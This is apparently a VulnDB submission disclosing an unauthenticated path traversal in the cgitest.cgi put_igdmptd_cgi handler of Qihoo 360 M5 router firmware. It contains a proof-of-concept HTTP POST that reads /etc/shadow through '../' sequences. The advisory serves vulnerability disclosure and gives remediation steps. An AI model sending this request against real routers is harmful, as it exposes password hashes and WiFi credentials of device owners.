# VulnDB Submission: 360 M5 cgitest.cgi put_igdmptd_cgi Path Traversal (Arbitrary File Read)

## 1. Title

360 M5 cgitest.cgi put_igdmptd_cgi Path Traversal (Arbitrary File Read)

## 2. Vulnerability Summary

- **Internal Tracking ID:** FRV-360-PT-001
- **VulnDB ID:** (Pending Assignment)
- **CVE ID:** (Pending Assignment)
- **Vulnerability Class:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- **Vulnerability Type:** Path Traversal (Arbitrary File Read)
- **Severity:** 7.5 (High)
- **Severity Label:** High
- **CVSS 3.1 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **Attack Prerequisites:** No privileges required
- **Verification Status:** CONFIRMED
- **Verification Evidence:** Ghidra DB static analysis — dataflow CONFIRMED

## 3. Affected Vendor / Product

- **Vendor:** Qihoo 360 Technology Co. Ltd.
- **Product:** 360 M5 Router
- **Affected Version / Firmware:** M5-4.0.17.1566-rel-upgrade.bin
- **Affected Component:** web/cgi-bin/cgitest.cgi ? put_igdmptd_cgi @ 0x5a338
- **Architecture:** MIPS32 (Big Endian)

## 4. Description

Path traversal in put_igdmptd_cgi (0x5a338) of cgitest.cgi. The 'put_file' parameter from get_form_value() flows to open()/fopen() without path sanitization. Attackers can use '../' sequences to read arbitrary files including /etc/shadow and configuration files.

## 5. Technical Details

**Affected Parameter(s):** put_file, applet

- **Source**: get_form_value('put_file')
- **Sink**: open() / fopen()
- **Dataflow**: get_form_value('put_file') → open() CONFIRMED
- **Binary paths**: /etc/360_pub.key, /tmp/igdmptd, /tmp/impd
- **Verification**: Ghidra DB static analysis — dataflow CONFIRMED

## 6. Proof of Concept / Reproduction

```http
POST /cgi-bin/cgitest.cgi HTTP/1.1
Host: <TARGET_IP>
Content-Type: application/x-www-form-urlencoded

applet=put_igdmptd_cgi&put_file=../../etc/shadow
```

## 7. Security Impact

Unauthenticated attacker can read arbitrary files on the router filesystem, including password hashes and WiFi credentials.

## 8. Remediation Recommendation

Canonicalize paths. Reject paths containing '..'. Use openat() with directory fd. Generate internal filenames.

## 9. Discovery / Credit

| Field | Value |
|-------|-------|
| **Method** | FirmRec Cross-Firmware Genetic Vulnerability Mining |
| **Date** | 2026-04-29 |
| **Discoverer** | ST4R |
| **Verification** | Ghidra DB static analysis — dataflow CONFIRMED |
| **Status** | CONFIRMED |

## 10. Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-04-29 | Vulnerability discovered via FirmRec automated pipeline |
| TBD | Vendor notification |
| TBD | CVE ID assigned |
| TBD | Public disclosure (+90 days) |

---
*Discovered via FirmRec — IoT Firmware Genetic Vulnerability Mining Framework*

## 11. Suggested VulnDB Tags

Qihoo, 360, CWE-22, Path Traversal (Arbitrary File Read), Firmware, IoT

---
Prepared from FirmRec vulnerability finding notes for VulnDB submission.
